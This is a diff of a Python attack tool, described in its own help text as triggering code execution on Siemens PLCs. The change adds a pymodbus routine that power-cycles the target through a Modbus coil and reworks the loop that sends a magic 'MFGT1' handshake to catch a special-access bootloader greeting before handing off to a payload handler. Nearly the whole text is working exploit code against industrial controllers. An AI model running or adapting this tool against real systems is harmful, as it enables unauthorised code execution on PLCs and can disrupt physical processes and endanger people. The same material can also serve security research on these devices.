@@ -12,6 +12,7 @@ import subprocess
 import os
 import argparse
 import logging
+from pymodbus.client.sync import ModbusTcpClient
 
 from binascii import hexlify
 
@@ -373,6 +374,21 @@ def handle_conn(r, action, args, payload_manager):
 magic = "MFGT1"
 pad = 4*"A"
 
+def switch_power(mode, modbus_ip, modbus_port, modbus_output):
+    toggle = True if mode == "on" else False
+    client = ModbusTcpClient(modbus_ip, port=modbus_port)
+    if not client.connect():
+        logger.error("[!] Could not connect to Modbus TCP device at %s:%d", modbus_ip, modbus_port)
+        return False
+    rr = client.write_coil(modbus_output, toggle)
+    if rr.isError():
+        logger.error("[!] Modbus write_coil failed: %s", rr)
+        client.close()
+        return False
+    client.close()
+    logger.info("[+] Modbus coil %d set to %s (Modbus TCP at %s:%d)", modbus_output, toggle, modbus_ip, modbus_port)
+    return True
+
 def main():
     parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')
 
@@ -391,7 +407,7 @@ def main():
     modbus_group = parser.add_argument_group('Modbus TCP arguments')
     modbus_group.add_argument('--modbus-ip', dest='modbus_ip', default='192.168.1.18', help='Modbus TCP IP address (default: 192.168.1.18)')
     modbus_group.add_argument('--modbus-port', dest='modbus_port', default=502, type=lambda x: int(x, 0), help='Modbus TCP port (default: 502)')
-    modbus_group.add_argument('--modbus-output', dest='modbus_output', default=None, help='Modbus output/channel to control')
+    modbus_group.add_argument('--modbus-output', dest='modbus_output', type=int, help='Modbus output/channel to control')
 
     subparsers = parser.add_subparsers(dest="action")
     parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK)
@@ -427,61 +443,45 @@ def main():
         sys.exit(1)
 
     if args.switch_power:
+        if args.modbus_output is None:
+            parser.error("--modbus-output is required when --switch-power is used")
+
         logger.info("Turning off power supply and sleeping for %d milliseconds", args.powersupply_delay)
-        power_args = [
-            '--method', 'modbus',
-            '--modbus-ip', str(args.modbus_ip) if args.modbus_ip else '',
-            '--modbus-port', str(args.modbus_port),
-        ]
-        if args.modbus_output is not None:
-            power_args += ['--modbus-output', str(args.modbus_output)]
-        try:
-            ret = subprocess.check_call(['tools/powersupply/switch_power.py'] + power_args + ['off'])
-            logger.info("[+] Turned off power supply, sleeping and starting handshake attempts")
-        except subprocess.CalledProcessError as e:
-            logger.error("[!] Failed to turn off power supply: %s", e)
+        if not switch_power('off', args.modbus_ip, args.modbus_port, args.modbus_output):
             sys.exit(1)
 
-        power_off_success = ret
-        if power_off_success == 0:
-            power_off_time = time.time()
-
-        handshake_received = False
-        handshake_start = time.time()
+        power_off_time = time.time()
         delay_sec = args.powersupply_delay / 1000.0
         power_on_time = power_off_time + delay_sec
-        power_on_actual = None
-        i = 0
-        while not handshake_received:
-            now = time.time()
-            if now >= power_on_time and power_on_actual is None:
-                try:
-                    ret = subprocess.check_call(['tools/powersupply/switch_power.py'] + power_args + ['on'])
-                    logger.info("[+] Turned on power supply after %d ms", args.powersupply_delay)
-                except subprocess.CalledProcessError as e:
-                    logger.error("[!] Failed to turn on power supply: %s", e)
-                    sys.exit(1)
-                power_on_actual = time.time()
-            if power_on_actual is not None and (now - power_on_actual) > 5.0:
-                logger.error("[!] Handshake timeout: did not receive special access greeting within 5 seconds after power on.")
-                sys.exit(1)
-            if power_on_time - now <= 0.2 or power_on_actual is not None:
-                s.send(pad + magic)
-                try:
-                    answ = s.recv(256, timeout=0.3)
-                except Exception:
-                    answ = ''
-                if answ and answ.startswith("\5-CPU"):
-                    if not answ.startswith("\5-CPU"):
-                        answ += s.recv(256)
-                    assert(answ.startswith("\5-CPU"))
-                    s.unrecv(answ)
-                    handshake_received = True
-                    logger.debug("[+] Special access greeting received!")
-                    handle_conn(s, args.action, args, payload_manager)
-                    break
-            i += 1
-        logger.info("Done.")
+
+        while time.time() < power_on_time:
+            time.sleep(0.01)
+
+        if not switch_power('on', args.modbus_ip, args.modbus_port, args.modbus_output):
+            sys.exit(1)
+
+        handshake_received = False
+        handshake_start_time = time.time()
+        while not handshake_received and (time.time() - handshake_start_time) < 2.0:
+            s.send(pad + magic)
+            try:
+                answ = s.recv(256, timeout=0.1)
+            except Exception:
+                answ = ''
+            if answ and answ.startswith("\5-CPU"):
+                if not answ.startswith("\5-CPU"):
+                    answ += s.recv(256)
+                assert(answ.startswith("\5-CPU"))
+                s.unrecv(answ)
+                handshake_received = True
+                logger.info("[+] Special access greeting received!")
+                handle_conn(s, args.action, args, payload_manager)
+                break
+            time.sleep(0.05)
+
+        if not handshake_received:
+            logger.error("[!] Handshake timeout: did not receive special access greeting within 2 seconds after power on.")
+            sys.exit(1)
         return
 
     handle_conn(s, args.action, args, payload_manager)
